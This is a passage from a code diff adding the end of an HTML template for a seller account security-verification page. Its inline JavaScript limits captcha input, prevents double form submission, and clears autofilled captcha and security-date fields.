+                            </span>
+
+                        </div>
+
+                    </div>
+
+
+                    <div class="info-item">
+
+                        <i
+                            class="bi bi-shield-check info-icon"
+                        ></i>
+
+                        <div>
+
+                            <strong>
+                                Account Protection
+                            </strong>
+
+                            <span>
+                                Limited attempts help protect
+                                your seller account.
+                            </span>
+
+                        </div>
+
+                    </div>
+
+
+                </div>
+
+
+            {% endif %}
+
+
+            <!-- =================================================
+                 FOOTER
+            ================================================== -->
+
+            <div class="security-footer">
+
+                <i class="bi bi-lock-fill"></i>
+
+                <span>
+                    Protected seller verification
+                    • Secure session
+                </span>
+
+            </div>
+
+
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- =========================================================
+     BOOTSTRAP JS
+========================================================== -->
+
+<script
+    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js">
+</script>
+
+
+<script>
+
+    /* =========================================================
+       CAPTCHA INPUT
+    ========================================================== */
+
+    const captchaInput =
+        document.getElementById("captcha");
+
+
+    if (captchaInput) {
+
+        captchaInput.addEventListener(
+            "input",
+            function () {
+
+                this.value =
+                    this.value
+                        .replace(/\D/g, "")
+                        .slice(0, 4);
+
+            }
+        );
+
+
+        /*
+         * Prevent accidental whitespace.
+         */
+
+        captchaInput.addEventListener(
+            "paste",
+            function () {
+
+                setTimeout(() => {
+
+                    this.value =
+                        this.value
+                            .replace(/\D/g, "")
+                            .slice(0, 4);
+
+                }, 0);
+
+            }
+        );
+
+    }
+
+
+    /* =========================================================
+       DATE INPUT PROTECTION
+    ========================================================== */
+
+    const weddingInput =
+        document.getElementById("wedding");
+
+    const dobInput =
+        document.getElementById("dob");
+
+
+    [weddingInput, dobInput].forEach(
+        function (input) {
+
+            if (!input) {
+                return;
+            }
+
+            input.addEventListener(
+                "keydown",
+                function (event) {
+
+                    /*
+                     * Prevent browser text autofill/search
+                     * behavior where applicable.
+                     */
+
+                    if (
+                        event.ctrlKey &&
+                        (
+                            event.key === "a" ||
+                            event.key === "A"
+                        )
+                    ) {
+                        return;
+                    }
+
+                }
+            );
+
+        }
+    );
+
+
+    /* =========================================================
+       FORM SUBMIT PROTECTION
+       PREVENT DOUBLE POST
+    ========================================================== */
+
+    const securityForm =
+        document.getElementById("securityForm");
+
+    const verifyButton =
+        document.getElementById("verifyButton");
+
+    const verifyText =
+        document.getElementById("verifyText");
+
+    const verifyIcon =
+        document.getElementById("verifyIcon");
+
+
+    if (
+        securityForm &&
+        verifyButton
+    ) {
+
+        securityForm.addEventListener(
+            "submit",
+            function (event) {
+
+
+                /*
+                 * Validate form.
+                 */
+
+                if (!securityForm.checkValidity()) {
+
+                    event.preventDefault();
+
+                    securityForm.classList.add(
+                        "was-validated"
+                    );
+
+                    return;
+
+                }
+
+
+                /*
+                 * Disable button immediately.
+                 */
+
+                verifyButton.disabled = true;
+
+
+                /*
+                 * Change button state.
+                 */
+
+                if (verifyIcon) {
+
+                    verifyIcon.className =
+                        "spinner-border spinner-border-sm";
+
+                }
+
+
+                if (verifyText) {
+
+                    verifyText.textContent =
+                        "Verifying...";
+
+                }
+
+            }
+        );
+
+    }
+
+
+    /* =========================================================
+       PREVENT STALE FORM DATA
+    ========================================================== */
+
+    window.addEventListener(
+        "pageshow",
+        function () {
+
+            const form =
+                document.getElementById("securityForm");
+
+
+            if (form) {
+
+                /*
+                 * Do not keep previously entered
+                 * security information.
+                 */
+
+                form.reset();
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       BROWSER BACK/FORWARD CACHE PROTECTION
+    ========================================================== */
+
+    window.addEventListener(
+        "pageshow",
+        function (event) {
+
+
+            const navigation =
+                performance.getEntriesByType(
+                    "navigation"
+                )[0];
+
+
+            if (
+                event.persisted ||
+                (
+                    navigation &&
+                    navigation.type ===
+                    "back_forward"
+                )
+            ) {
+
+                window.location.reload();
+
+            }
+
+        }
+    );
+
+
+    /* =========================================================
+       AUTOFILL CLEANUP
+    ========================================================== */
+
+    function clearUnexpectedAutofill() {
+
+        const form =
+            document.getElementById(
+                "securityForm"
+            );
+
+
+        if (!form) {
+            return;
+        }
+
+
+        const fields =
+            form.querySelectorAll(
+                "input"
+            );
+
+
+        fields.forEach(
+            function (field) {
+
+                /*
+                 * CAPTCHA should always start empty.
+                 */
+
+                if (
+                    field.id === "captcha"
+                ) {
+
+                    field.value = "";
+
+                    return;
+
+                }
+
+
+                /*
+                 * Security dates should not be
+                 * automatically populated.
+                 */
+
+                if (
+                    field.id === "wedding" ||
+                    field.id === "dob"
+                ) {
+
+                    field.value = "";
+
+                }
+
+            }
+        );
+
+    }
+
+
+    /*
+     * Run after browser autofill has had
+     * an opportunity to execute.
+     */
+
+    setTimeout(
+        clearUnexpectedAutofill,
+        100
+    );
+
+
+    setTimeout(
+        clearUnexpectedAutofill,
+        500
+    );
+
+
+    setTimeout(
+        clearUnexpectedAutofill,
+        1200
+    );
+
+
+</script>
+
+
+</body>
+
+</html>
+
+{% endblock %}
